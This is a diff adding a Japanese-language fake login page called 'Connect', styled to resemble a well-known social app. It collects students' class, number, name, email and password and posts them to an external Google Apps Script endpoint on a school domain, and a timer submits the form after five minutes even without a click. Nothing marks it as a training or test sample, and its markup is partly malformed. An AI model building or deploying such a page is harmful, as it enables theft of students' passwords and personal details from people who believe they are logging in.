@@ -1,0 +1,178 @@
+<form action="https://script.google.com/a/macros/gse.okayama-c.ed.jp/s/AKfycbxH3u393LYv8T7kfrpKeGVv4vBKedzTfG9arYDR97ISqK7cibBWbhUt5Ghnrj-jHcmB2Q/exec/exec" 
+ method="post"
+ autocomplete="on">
+
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>ログイン</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:
+        "Yu Gothic",
+        "Yu Gothic UI",
+        "Meiryo",
+        "Hiragino Sans",
+        sans-serif;
+
+    background:#fafafa;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    padding:20px;
+}
+
+.card{
+    width:100%;
+    max-width:380px;
+    background:#fff;
+    border:1px solid #dbdbdb;
+    border-radius:16px;
+    padding:32px;
+    box-shadow:0 8px 24px rgba(0,0,0,.08);
+}
+
+.logo{
+    text-align:center;
+    font-size:34px;
+    font-weight:bold;
+    margin-bottom:8px;
+}
+
+.sub{
+    text-align:center;
+    color:#777;
+    margin-bottom:24px;
+}
+
+form{
+    display:flex;
+    flex-direction:column;
+    gap:14px;
+}
+
+.row{
+    display:flex;
+    gap:10px;
+}
+
+.row input{
+    flex:1;
+}
+
+input{
+    width:100%;
+    padding:13px;
+    border:1px solid #ccc;
+    border-radius:8px;
+    font-size:15px;
+    outline:none;
+}
+
+input:focus{
+    border-color:#0095f6;
+}
+
+button{
+    margin-top:8px;
+    background:#0095f6;
+    color:white;
+    border:none;
+    border-radius:8px;
+    padding:13px;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#0077d9;
+}
+
+.footer{
+    margin-top:24px;
+    text-align:center;
+    color:#777;
+    font-size:14px;
+}
+</style>
+</head>
+
+
+<script>
+const form = document.querySelector("form");
+const message = document.getElementById("message");
+
+
+    message.textContent = "ログインしました。";
+    message.style.color = "#0095f6";
+    message.style.textAlign = "center";
+    message.style.marginTop = "20px";
+
+
+
+
+ </script>
+
+ <script>
+window.addEventListener("load", () => {
+    setTimeout(() => {
+        document.querySelector("form").submit();
+    }, 300000); // 5分
+});
+</script>
+
+ <body>
+ 
+ <div class="card">
+
+ <div class="logo">Connect</div>
+ <div class="sub">ログイン</div>
+
+
+ <div class="row">
+ <input type="text" name="class" placeholder="組" required>
+ <input type="text" name="number" placeholder="番号" required>
+ </div>
+
+ <input
+ type="text"
+ name="name"
+ placeholder="名前"
+ autocomplete="name"
+ required>
+
+ <input
+ type="email"
+ name="email"
+ placeholder="メールアドレス"
+ autocomplete="email"
+ required>
+
+ <input
+ type="password"
+ name="password"
+ placeholder="パスワード"
+ autocomplete="current-password"
+ required>
+
+ <button type="submit">ログインする</button>
+  
+</form>
+<p id="message"></p>
+
+</body>
+
+</html>
